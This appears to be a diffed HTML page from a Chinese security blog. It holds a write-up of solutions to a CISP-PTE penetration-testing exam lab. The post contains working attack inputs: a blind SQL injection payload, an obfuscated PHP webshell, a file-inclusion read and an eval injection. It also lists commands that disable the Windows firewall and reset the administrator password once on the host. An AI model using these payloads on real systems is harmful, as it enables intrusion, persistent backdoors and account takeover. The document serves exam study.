@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>Archive | RainMaker</title>
+    <title>2021-12月CISP-PTE考试总结 | RainMaker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
     
@@ -34,7 +34,7 @@
 
 
     <script>
-        window.isPost = false
+        window.isPost = true
         window.aomori = {
             
             
@@ -130,148 +130,147 @@
         <div class="main">
             <section class="inner">
                 <section class="inner-main">
-                    <section class="archives-cover"></section>
+                    <div class="post">
+    <article id="post-ckxo4tvbq0001hg4z4cr626ys" class="article article-type-post" itemscope
+    itemprop="blogPost">
 
+    <div class="article-inner">
 
-    
-    
-    
-    
-    <section class="archives-wrap">
-        <div class="archive-year-wrap">
-        <a href="/archives/2021" class="archive-year">2021</a>
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      2021-12月CISP-PTE考试总结
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2021-12-27T01:44:57.000Z" itemprop="datePublished">2021-12-27</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/CTF/">CTF</a>,<a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PTE/" rel="tag">PTE</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/ddad802f.html">2021-12月CISP-PTE考试总结</a>
-    </h1>
-  
 
-</article>
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <p>12月末参加了PTE考试，题不算难，但考试操作环境垃圾的一瞥，sqlmap不能跑，20道选择，5道基础题，1道综合题，如果不卡壳花4个小时做完也是很有压力。选择题就不说了，主要记录一下大题解法，当然方法不止一种。</p>
+<h1 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h1><p>sqlmap长时间没更新，跑不起来，只能手注，使用二分法，利用burpsuite慢慢跑，阿西吧。</p>
+<pre><code class="hljs mysql">title=222%27/**/and/**/(if((ascii(substr((select/**/group_concat(password)/**/from/**/users1/**/where/**/username=&#x27;admin&#x27;),1,1))=107),sleep(5),0))/**/and/**/%27abc%27=%27abc&amp;content=/**/</code></pre>
 
-    
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/80ca6920.html">记一次SSRF练习</a>
-    </h1>
-  
+<h1 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h1><p>搞一个php免杀马直接上传即可。</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$b</span> = substr_replace(<span class="hljs-string">&quot;assexx&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-number">4</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$arrayName</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-variable">$b</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pte&#x27;</span>])))<span class="hljs-meta">?&gt;</span></code></pre>
 
-</article>
+<h1 id="三、文件包含"><a href="#三、文件包含" class="headerlink" title="三、文件包含"></a>三、文件包含</h1><pre><code class="hljs php">php:/php:<span class="hljs-comment">///filter/read=convert.base64-encode/resource=../key3.php</span></code></pre>
 
-    
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/7209cfed.html">Log4j漏洞内网检测</a>
-    </h1>
-  
+<h1 id="四、代码审计"><a href="#四、代码审计" class="headerlink" title="四、代码审计"></a>四、代码审计</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+	error_repoerting(<span class="hljs-number">0</span>);
+	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;key4.php&quot;</span>;
+	<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
+	<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$o=strtolower(\&quot;<span class="hljs-subst">$a</span>\&quot;);&quot;</span>);
+	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$o</span>;
+	show_source(<span class="hljs-keyword">__FILE__</span>);</code></pre>
 
-</article>
+<p>a参数直接传入<code>$&#123;@eval($_POST[1])&#125;</code>，<code>POST 1=cat%20key4.php</code>。</p>
+<h1 id="五、失效的访问控制。"><a href="#五、失效的访问控制。" class="headerlink" title="五、失效的访问控制。"></a>五、失效的访问控制。</h1><p>修改<code>Isadmin=false&amp;username=R3Vlc3Q%3D</code> 为<code>Isadmin=true&amp;username=YWRtaW4%3D</code>即可。</p>
+<h1 id="六、综合题"><a href="#六、综合题" class="headerlink" title="六、综合题"></a>六、综合题</h1><p>综合题是一个图片管理系统，目录扫描发现PhpMyAdmin和后台，PhpMyAdmin弱口令root/root登录，获取key6。发现在数据库images 的 system表中有admin的密码hash，修改为123456的md5hash登录即可。登录后台后传入木马，菜刀连接，翻一翻网站目录发现key7。最后一个key8提示在桌面，那就是要远程连接查看。首先关闭防火墙<code>netsh advfirewall set allprofiles state off</code>，之后利用他的工具库里边的3389端口开启脚本，上传到网站目录下并执行，开启3389端口（上传失败就鼠标拖动到菜刀的网站目录下）。修改administrator的密码<code>net user administrator 123456</code>，mstsc 远程连接，在回收站找到key8。</p>
+
+        </div>
+
+    </div>
 
     
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/f0bfc07b.html">Empire-配置安装和基本使用</a>
-    </h1>
-  
-
-</article>
 
     
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/40b5e599.html">内网学习笔记一 | 内网信息搜集</a>
-    </h1>
-  
-
-</article>
 
     
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/a74c6112.html">快速设置博客前页-Front-matter</a>
-    </h1>
-  
-
-</article>
 
     
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/1bfef19e.html">反制Goby扫描之XSS点击上线</a>
-    </h1>
-  
+<div class="article-copyright hairline">
+  <p>
+    本作品采用 <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a> 进行许可。
+  </p>
+</div>
 
-</article>
 
     
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/a7a10e0e.html">docx批量转markdown脚本分享</a>
-    </h1>
-  
-
-</article>
 
     
-    
-    <article class="archive-article archive-type-post">
+<nav class="article-nav">
   
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/243e66cd.html">CS分离免杀实践</a>
-    </h1>
+    <a href="/80ca6920.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">记一次SSRF练习</div>
+    </a>
   
+</nav>
 
-</article>
 
-    
-    
-    <article class="archive-article archive-type-post">
-  
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/cc2daa49.html">渗透测试知识梳理-注入类-1-SQL注入-Oracle</a>
-    </h1>
-  
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=2021-12月CISP-PTE考试总结 - RainMaker&url=http://hasaki-h2.github.io/ddad802f.html">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=2021-12月CISP-PTE考试总结 - RainMaker&u=http://hasaki-h2.github.io/ddad802f.html">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=2021-12月CISP-PTE考试总结 - RainMaker&url=http://hasaki-h2.github.io/ddad802f.html&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
 
 </article>
 
 
-    </div></section>
 
 
 
-  <nav class="pagination">
-    
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" href="/archives/page/2/">下一页</a>
-  </nav>
 
 
+
+<section class="comments">
+    <div id="valine-container"></div>
+</section>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+
+
+<script src="./js/busuanzi.pure.mini.js"></script>
+
+</div>
                 </section>
             </section>
 
@@ -293,6 +292,12 @@
 <div class="widget" id="widget">
     
       
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
     
       
   <div class="widget-wrap widget-cate">
